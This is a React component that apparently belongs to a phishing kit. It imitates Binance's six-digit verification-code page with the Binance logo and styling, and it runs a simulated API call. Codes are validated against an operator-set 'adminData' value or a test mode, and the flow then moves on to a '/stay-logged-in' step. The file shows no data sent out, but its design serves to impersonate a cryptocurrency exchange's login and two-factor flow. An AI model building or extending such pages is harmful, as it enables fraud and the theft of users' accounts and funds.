import { useState, useRef, useEffect } from 'react';
import { useApp } from '@/contexts/AppContext';
import { LoadingOverlay } from '@/pages/LoadingScreen';
import { maskEmail } from '@/utils/validation';

export function Verification() {
  const { adminData, showToast } = useApp();
  const [code, setCode] = useState(['', '', '', '', '', '']);
  const [isLoading, setIsLoading] = useState(false);
  const [showLoadingOverlay, setShowLoadingOverlay] = useState(false);
  const [timer, setTimer] = useState(29);
  const [canResend, setCanResend] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const loginIdentifier = sessionStorage.getItem('loginIdentifier') || 'user@example.com';
  const maskedIdentifier = maskEmail(loginIdentifier);

  // Timer countdown
  useEffect(() => {
    if (timer > 0 && !canResend) {
      const interval = setInterval(() => {
        setTimer((prev) => {
          if (prev <= 1) {
            setCanResend(true);
            clearInterval(interval);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [timer, canResend]);

  const handleInputChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;

    const newCode = [...code];
    newCode[index] = value.slice(-1);
    setCode(newCode);

    // Auto-focus next input
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }

    // Auto-submit when all digits entered
    if (index === 5 && value) {
      const fullCode = [...newCode.slice(0, 5), value.slice(-1)].join('');
      if (fullCode.length === 6) {
        setTimeout(() => handleVerify(fullCode), 100);
      }
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !code[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasteData = e.clipboardData.getData('text').slice(0, 6);
    if (!/^\d+$/.test(pasteData)) return;

    const newCode = pasteData.split('').map((char, i) => char || code[i] || '');
    setCode(newCode);

    // Focus appropriate input
    const nextIndex = Math.min(pasteData.length, 5);
    inputRefs.current[nextIndex]?.focus();

    // Auto-submit if paste fills all
    if (pasteData.length === 6) {
      setTimeout(() => handleVerify(pasteData), 100);
    }
  };

  const handleResend = () => {
    if (!canResend) return;
    setTimer(60);
    setCanResend(false);
    showToast('Verification code resent', 'success');
  };

  const handleVerify = async (fullCode?: string) => {
    const codeToVerify = fullCode || code.join('');

    if (codeToVerify.length !== 6) {
      // Shake animation
      const form = document.getElementById('otp-form');
      if (form) {
        form.classList.remove('shake');
        void form.offsetWidth;
        form.classList.add('shake');
      }
      return;
    }

    setIsLoading(true);

    // Simulate API call (2s)
    await new Promise(resolve => setTimeout(resolve, 2000));

    // Validate code against admin setting (or test mode)
    const validCodes = adminData.authVerificationCode.split(',').map(c => c.trim());
    const isValid = adminData.testMode || validCodes.includes(codeToVerify);

    setIsLoading(false);

    if (isValid) {
      setShowLoadingOverlay(true);
    } else {
      showToast('Invalid verification code. Please try again.', 'error');
      setCode(['', '', '', '', '', '']);
      inputRefs.current[0]?.focus();
    }
  };

  return (
    <div className="min-h-screen bg-[#1D252B] flex flex-col items-center justify-between text-white">
      <LoadingOverlay show={showLoadingOverlay} redirectTo="/stay-logged-in" />
      <style>{`
        @keyframes loading-bar {
          0%, 100% { transform: scaleY(0.6); opacity: 0.6; }
          50% { transform: scaleY(1); opacity: 1; }
        }
        @keyframes shake {
          10%, 90% { transform: translate3d(-1px, 0, 0); }
          20%, 80% { transform: translate3d(2px, 0, 0); }
          30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
          40%, 60% { transform: translate3d(4px, 0, 0); }
        }
        .shake {
          animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
        }
      `}</style>

      {/* Main Container */}
      <div className="w-full max-w-md px-6 pt-8 pb-6 flex-grow flex flex-col">
        {/* Logo */}
        <div className="mb-8">
          <img src="/source/logo.png" alt="Binance" className="h-8 w-auto" />
        </div>

        {/* Content */}
        <div className="w-full text-left">
          <h1 className="text-[32px] font-bold mb-3 text-white tracking-tight">Verification Code</h1>
          <p className="text-[#848e9c] text-sm mb-8 break-words">
            Enter the 6-digit code sent to <span className="text-[#b7bdc6]">{maskedIdentifier}</span>
          </p>

          {/* OTP Inputs */}
          <form id="otp-form" className="flex justify-between gap-2 mb-6" onSubmit={(e) => { e.preventDefault(); handleVerify(); }}>
            {code.map((digit, index) => (
              <input
                key={index}
                ref={(el) => { inputRefs.current[index] = el; }}
                type="text"
                maxLength={1}
                inputMode="numeric"
                pattern="[0-9]*"
                value={digit}
                onChange={(e) => handleInputChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                onPaste={handlePaste}
                className="w-[14%] aspect-square rounded-lg text-center text-xl font-semibold text-white bg-[#1D252B] border-[1.5px] border-[#474d57] caret-[#F0B90B] focus:border-[#F0B90B] focus:shadow-[0_0_0_1px_#F0B90B] focus:outline-none transition-all"
              />
            ))}
          </form>

          {/* Continue Button */}
          <button
            onClick={() => handleVerify()}
            disabled={isLoading}
            className="w-full bg-[#F0B90B] text-[#1D252B] border-none rounded-lg font-bold cursor-pointer transition-all flex justify-center items-center h-12 sm:h-[52px] md:h-12 lg:h-11 px-5 sm:px-6 md:px-8 lg:px-10 text-[15px] sm:text-base md:text-[15px] lg:text-base hover:bg-[#F8D33A] active:bg-[#E5AC00] disabled:opacity-70 disabled:cursor-not-allowed"
          >
            {isLoading ? (
              <div className="flex items-center justify-center gap-[3px] h-5">
                <span className="w-1 bg-[#1D252B] rounded-sm animate-[loading-bar_1.2s_ease-in-out_infinite] h-3"></span>
                <span className="w-1 bg-[#1D252B] rounded-sm animate-[loading-bar_1.2s_ease-in-out_infinite_0.15s] h-[18px]"></span>
                <span className="w-1 bg-[#1D252B] rounded-sm animate-[loading-bar_1.2s_ease-in-out_infinite_0.3s] h-3.5"></span>
                <span className="w-1 bg-[#1D252B] rounded-sm animate-[loading-bar_1.2s_ease-in-out_infinite_0.45s] h-4"></span>
              </div>
            ) : (
              'Continue'
            )}
          </button>

          {/* Resend Timer */}
          <div className="mt-6 text-center">
            {canResend ? (
              <button
                onClick={handleResend}
                className="text-[#F0B90B] text-sm font-medium cursor-pointer hover:text-[#F8D33A] transition-colors"
              >
                Resend code
              </button>
            ) : (
              <button disabled className="text-[#5e6673] text-sm cursor-default font-medium">
                Resend code in <span>{timer}</span>s
              </button>
            )}
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="w-full py-6 text-center">
        <div className="flex justify-center items-center space-x-8 text-[#5e6673] text-sm">
          <button className="flex items-center hover:text-[#b7bdc6] transition-colors font-medium">
            <svg className="w-4 h-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"/>
            </svg>
            English
          </button>
          <button className="hover:text-[#b7bdc6] transition-colors font-medium">Cookies</button>
          <button className="hover:text-[#b7bdc6] transition-colors font-medium">Privacy</button>
        </div>
      </footer>
    </div>
  );
}

export default Verification;
